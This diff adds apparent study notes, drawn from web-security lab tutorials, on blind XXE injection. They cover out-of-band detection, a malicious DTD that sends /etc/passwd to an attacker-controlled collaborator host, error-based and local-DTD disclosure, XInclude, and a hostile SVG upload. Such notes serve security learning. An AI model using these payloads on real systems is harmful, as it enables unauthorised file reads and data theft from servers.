@@ -1,0 +1,162 @@
+   Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses
+   
+            There are two broad ways in which you can find and exploit blind XXE vulnerabilities:
+
+    You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
+    You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
+
+   Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead.
+   
+            DECLARE XML PARAMITER ENTITY
+      First, the declaration of an XML parameter entity includes the percent character before the entity name: 
+           <!ENTITY % myparameterentity "my parameter entity value" >
+           
+   And second, parameter entities are referenced using the percent character instead of the usual ampersand: 
+           %myparameterentity;
+   
+   This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows: 
+            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+            <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
+            
+   This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful
+   
+                     
+                     Exploiting blind XXE to exfiltrate data out-of-band 
+                     
+   Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited.
+   
+   An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
+             <!ENTITY % file SYSTEM "file:///etc/passwd">
+             <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
+             %eval;
+              %exfiltrate;
+              
+              save the link  file with DTD extension store Then click VIEW-EXPLOIT and copy the URL
+              
+              EXAMPLE https://exploit-ac491f251f523a3fc0253eb701ab0051.web-security-academy.net/exploit.dtd  //YOUR-DTD-URL
+              
+              GO to the burpsuit
+                Paste this xml payload
+                <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+                
+    Then send the request and click "POLL NOW " on the burp collaborate you will see some DNS and HTTP traffics
+    
+              Exploiting blind XXE to retrieve data via error messages
+              
+  An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. 
+  This will be effective if the application returns the resulting error message within its response. 
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+        %error;
+        
+        This DTD carries out the following steps: 
+        
+  Defines an XML parameter entity called file, containing the contents of the /etc/passwd file. 
+  
+  Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. 
+  The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity. 
+  
+  Uses the eval entity, which causes the dynamic declaration of the error entity to be performed. 
+  
+  Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file. 
+  
+   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+   
+   
+                Exploiting blind XXE by repurposing a local DTD
+  For example, suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called custom_entity. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following:
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+                       
+
+            Locating an existing DTD file to repurpose
+ For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. 
+ You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing: 
+ 
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+
+After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine.
+Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search. 
+
+This DTD carries out the following steps: 
+
+Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem. 
+
+Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. 
+The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file. 
+
+Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. 
+This results in the desired error message
+
+NOTE 
+This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file. 
+
+  
+                 
+                       Finding hidden attack surface for XXE injection
+ XInclude attacks
+  Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. 
+  An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service
+  
+  In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element.
+  
+  However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.
+
+To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+          
+                XXE attacks via file upload
+Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents.
+Examples of XML-based formats are office document formats like DOCX and image formats like SVG. 
+
+For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded.
+Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images.
+Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+Save the image as avatar.svg then upload
+Inspect the page source to see the uploaded image 
+
+                    
+                          XXE attacks via modified content type
+   Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
+
+For example, if a normal request contains the following:
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+
+ Then you might be able submit the following request, with the same result:
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+
+
+
+
+
+                
+  
+               
+              
